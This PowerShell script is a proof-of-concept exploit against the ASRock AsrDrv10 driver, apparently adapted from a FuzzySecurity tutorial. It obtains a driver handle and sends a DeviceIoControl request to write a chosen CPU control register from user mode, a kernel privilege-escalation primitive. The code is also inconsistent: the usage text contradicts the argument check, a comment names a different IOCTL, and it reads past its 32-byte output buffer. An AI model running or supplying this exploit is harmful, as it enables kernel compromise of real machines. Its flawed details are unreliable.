# Based of FuzzeySec example code located at https://www.fuzzysecurity.com/tutorials/expDev/23.html
Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
   
public static class Driver
{
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr CreateFile(
        String lpFileName,
        UInt32 dwDesiredAccess,
        UInt32 dwShareMode,
        IntPtr lpSecurityAttributes,
        UInt32 dwCreationDisposition,
        UInt32 dwFlagsAndAttributes,
        IntPtr hTemplateFile);
   
    [DllImport("Kernel32.dll", SetLastError = true)]
    public static extern bool DeviceIoControl(
        IntPtr hDevice,
        int IoControlCode,
        byte[] InBuffer,
        int nInBufferSize,
        IntPtr OutBuffer,
        int nOutBufferSize,
        ref int pBytesReturned,
        IntPtr Overlapped);
 
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(
        IntPtr lpAddress,
        uint dwSize,
        UInt32 flAllocationType,
        UInt32 flProtect);
}
"@
 
#----------------[Get Driver Handle]
 
 if ($args.Count -ne 2) {
    echo "`n[!] Usage: script.ps1 CR#"
	"CR# == The CR register you would like to read (0,2,3,4,8)"
    Return
	}
	
	
	
$hDevice = [Driver]::CreateFile("\\.\AsrDrv10", [System.IO.FileAccess]::ReadWrite,
[System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)
 
if ($hDevice -eq -2) {
    echo "`n[!] Unable to get driver handle..`n"
	"Did you load the AsrDrv10 driver?"
    Return
} else {
    echo "`n[>] Driver access OK.."
    echo "[+] lpFileName: \\.\AsrDrv10"
    echo "[+] Handle: $hDevice"
}
 
#----------------[Prepare buffer & Send IOCTL]

# 0x22286c readcr 
# 170678


$InBuffer = @(
[System.BitConverter]::GetBytes([Int32]$args[0]) + 
[System.BitConverter]::GetBytes([Int32]0x0) +
[System.BitConverter]::GetBytes([Int64]$args[1])
)
#echo "[x] -" $InBuffer

$OutBuffer = [Driver]::VirtualAlloc([System.IntPtr]::Zero, 32, 0x3000, 0x40)
$IntRet = 0
$CallResult = [Driver]::DeviceIoControl($hDevice, 0x222870, $InBuffer, $InBuffer.Length, $OutBuffer, 32, [ref]$IntRet, [System.IntPtr]::Zero)
if (!$CallResult) {
    echo "`n[!] DeviceIoControl failed..`n"
    Return
}
 
#----------------[Read out the result buffer]

echo "`n[>] Call result:"
"Writing CR{0:X}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt64($OutBuffer.ToInt64()))
"Value={0:X}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt64($OutBuffer.ToInt64()+64))

